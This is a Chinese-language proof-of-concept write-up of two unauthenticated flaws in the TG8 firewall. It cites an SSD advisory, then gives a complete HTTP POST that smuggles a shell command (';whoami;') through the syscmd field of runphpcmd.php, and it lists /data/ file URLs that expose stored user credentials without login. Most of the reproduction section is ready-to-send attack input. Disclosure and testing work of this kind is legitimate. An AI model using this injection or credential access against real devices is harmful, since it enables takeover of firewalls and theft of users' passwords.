# TG8 防火墙 RCE及密码泄漏漏洞

## 漏洞描述

TG8防火墙中存在两个漏洞，远程用户可以以用户身份执行命令而无需通过设备进行身份验证。第二个漏洞允许在不经过身份验证的情况下公开现有用户的密码。

参考链接：

- https://ssd-disclosure.com/ssd-advisory-tg8-firewall-preauth-rce-and-password-disclosure/

## 漏洞复现

### RCE

poc：

```
POST http://<server>/admin/runphpcmd.php HTTP/1.1
Host: Server
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:86.0) Gecko/20100101 Firefox/86.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 68
Connection: keep-alive


syscmd=sudo+%2Fhome%2FTG8%2Fv3%2Fsyscmd%2Fcheck_gui_login.sh+<Payload>++local
```

执行whoami：

```
syscmd=sudo+/home/TG8/v3/syscmd/check_gui_login.sh+;whoami;++local
```

### 密码泄露

/data/目录下储存了登录过用户的凭据，无需登录即可访问此目录下的文件。

例如：

```
http://<server>/data/w-341.tg
http://<server>/data/w-342.tg
http://<server>/data/r-341.tg
http://<server>/data/r-342.tg
```

